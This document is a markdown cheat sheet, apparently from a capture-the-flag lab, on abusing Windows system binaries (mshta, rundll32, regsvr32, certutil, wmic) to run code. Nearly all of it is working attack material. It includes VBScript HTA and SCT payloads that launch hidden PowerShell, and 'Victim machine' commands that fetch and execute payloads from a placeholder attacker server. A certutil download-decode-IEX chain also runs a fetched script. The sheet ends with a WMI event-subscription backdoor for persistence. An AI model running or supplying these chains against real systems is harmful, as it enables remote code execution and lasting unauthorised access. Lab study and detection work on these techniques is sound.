# LOLBins

## mshta.exe

### 1) Create payload.hta

    <script language="VBScript">
    Sub Main()
        Set shell = CreateObject("WScript.Shell")
        shell.Run "powershell -NoP -Command ""[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VEhNe21zaHRhX2wxdjNzXzBufQ==')) | Out-File -FilePath C:\Windows\Temp\mshta_out.txt -Encoding ascii""", 0, True
        self.close
    End Sub
    Main
    </script>

### 2) Host the payload on your server

    python3 -m http.server 8000

### 3) Run the LOLBin

Victim machine

    mshta.exe http://CONNECTION_IP:8000/payload.hta

## rundll32.exe

### 1) Run the LOLBin against a pre-staged DLL file

Victim machine

    rundll32.exe C:\temp\payload.dll,EntryPoint

## regsvr32.exe (Squiblydoo)

### 1) Create payload.sct

    <?XML version="1.0"?>
    <scriptlet>
    <registration progid="Fileless" classid="{10001111-0000-0000-0000-0000FEEDACDC}">
    <script language="VBScript">
    <![CDATA[
          Set shell = CreateObject("WScript.Shell")
          shell.Run "powershell -NoP -Command ""[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VEhNe3NjcjFwdF8xc19yMzRsfQ==')) | Out-File -FilePath C:\Windows\Temp\sct_out.txt -Encoding ascii""", 0, True
    ]]>
    </script>
    </registration>
    </scriptlet>

### 2) Host it

    python3 -m http.server 8000

### 3) Run the LOLBin

Victim machine

    regsvr32.exe /s /n /u /i:http://CONNECTION_IP:8000/payload.sct scrobj.dll

## certutil.exe

### 1) Create payload.ps1

    echo 'Write-Host "PWNED_LOLBIN"' > payload.ps1

### 2) Add certificate wrapper and encode it as Base64 for certutil to execute

    { echo '-----BEGIN CERTIFICATE-----'; base64 -w0 payload.ps1; echo; echo '-----END CERTIFICATE-----'; } > encoded_payload.b64

### 3) Run the LOLBin to download the encoded payload

Victim machine

    certutil.exe -urlcache -f http://CONNECTION_IP:8000/encoded_payload.b64 C:\Windows\Temp\encoded_payload.b64

### 4) Decode the payload with the LOLBin

Victim machine

    certutil.exe -decode C:\Windows\Temp\encoded_payload.b64 C:\Windows\Temp\decoded_payload.ps1

### 5) Load decoded script into memory via Powershell

Victim machine

    IEX(Get-Content C:\Windows\Temp\decoded_payload.ps1 -Raw)

## wmic.exe

### 1) Run the LOLBin

Victim machine

    wmic process call create "cmd.exe /c hostname > C:\Windows\Temp\wmi_out.txt"

### 2) Create a backdoor

Victim machine

    $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name="BackdoorTrigger";EventNamespace="root\cimv2";QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 60"}
    $consumer = Set-WmiInstance -Namespace root\subscription -Class ActiveScriptEventConsumer -Arguments @{Name="BackdoorConsumer";ScriptingEngine="VBScript";ScriptText='Set shell = CreateObject("WScript.Shell"): shell.Run "powershell -NoP -Command ""[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(''VEhNe3dtMV9wM3JzMXN0M25jM30='')) | Out-File -FilePath C:\Windows\Temp\wmi_flag.txt -Encoding ascii""",0,False'}
    Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter;Consumer=$consumer}

Confirm subscription creation

    Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding

Wait for a couple of minutes to run and BOOM!

Subscription cleanup

    Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter -like '*BackdoorTrigger*'} | Remove-WmiObject; Get-WmiObject -Namespace root\subscription -Class ActiveScriptEventConsumer | Where-Object {$_.Name -eq 'BackdoorConsumer'} | Remove-WmiObject; Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -eq 'BackdoorTrigger'} | Remove-WmiObject


